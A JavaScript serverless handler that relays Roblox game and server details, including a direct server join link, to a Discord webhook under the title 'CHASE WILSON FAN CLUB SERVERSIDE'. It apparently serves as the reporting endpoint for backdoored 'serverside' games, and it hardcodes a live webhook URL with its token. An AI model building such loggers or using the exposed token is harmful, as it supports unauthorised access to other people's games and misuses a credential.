import fetch from "node-fetch";

const WEBHOOK_URL = "https://discord.com/api/webhooks/1485400530355224777/DWtytBOfUSYJXipbvYV2-g2YGm6ySaF8clyz_ZnwGFGSbW4vSq6ebgwVnp2N1TkioImM";
const DEFAULT_THUMBNAIL = "https://t3.rbxcdn.com/9fc30fe577bf95e045c9a3d4abaca05d";
const DEFAULT_IMAGE = "https://media.discordapp.net/attachments/1479908190551408660/1485021148671512676/image.png";

async function getUniverseId(placeId) {
    try {
        const res = await fetch(`https://apis.roproxy.com/universes/v1/places/${placeId}/universe`);
        const data = await res.json();
        return data.universeId || null;
    } catch {
        return null;
    }
}

async function getGameThumbnail(universeId) {
    if (!universeId) return DEFAULT_THUMBNAIL;
    try {
        const res = await fetch(`https://thumbnails.roproxy.com/v1/games/icons?universeIds=${universeId}&size=256x256&format=Png`);
        const data = await res.json();
        return data.data[0]?.imageUrl || DEFAULT_THUMBNAIL;
    } catch {
        return DEFAULT_THUMBNAIL;
    }
}

async function getUniversePlayers(universeId) {
    if (!universeId) return 0;
    try {
        const res = await fetch(`https://games.roproxy.com/v1/games?universeIds=${universeId}`);
        const data = await res.json();
        return data.data[0]?.playing || 0;
    } catch {
        return 0;
    }
}

export default async function handler(req, res) {
    if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

    try {
        const data = typeof req.body === "string" ? JSON.parse(req.body) : req.body;
        if (!data) return res.status(400).json({ error: "No data received" });

        const universeId = await getUniverseId(data.placeId);
        const thumbnail = await getGameThumbnail(universeId);
        const universePlayers = await getUniversePlayers(universeId);

        const joinCode = `roblox://experiences/start?placeId=${data.placeId}&gameInstanceId=${data.serverId}`;
        const gamePageLink = `https://www.roblox.com/games/${data.placeId}`;

        const payload = {
            embeds: [
                {
                    title: "CHASE WILSON FAN CLUB SERVERSIDE",
                    description: `[${data.name}](${gamePageLink})`,
                    color: 0x47FF94,
                    thumbnail: { url: thumbnail },
                    image: { url: DEFAULT_IMAGE },
                    fields: [
                        {
                            name: "Creator",
                            value: `Name: ${data.creatorName}\nId: ${data.creatorId}`,
                            inline: false
                        },
                        {
                            name: "Game",
                            value: `Name: ${data.name}\nId: ${data.placeId}\nDescription: ${data.description}\nPlayers in Universe: ${universePlayers}`,
                            inline: false
                        },
                        {
                            name: "Server",
                            value: `Id: ${data.serverId}\nPlayers: ${data.players}/${data.maxPlayers}\nJoin code:\n\`\`\`${joinCode}\`\`\``,
                            inline: false
                        }
                    ]
                }
            ]
        };

        const discordRes = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!discordRes.ok) {
            const text = await discordRes.text();
            return res.status(500).json({ error: text });
        }

        return res.status(200).json({ success: true });
    } catch (err) {
        console.error("API ERROR:", err);
        return res.status(500).json({ error: err.message });
    }
}
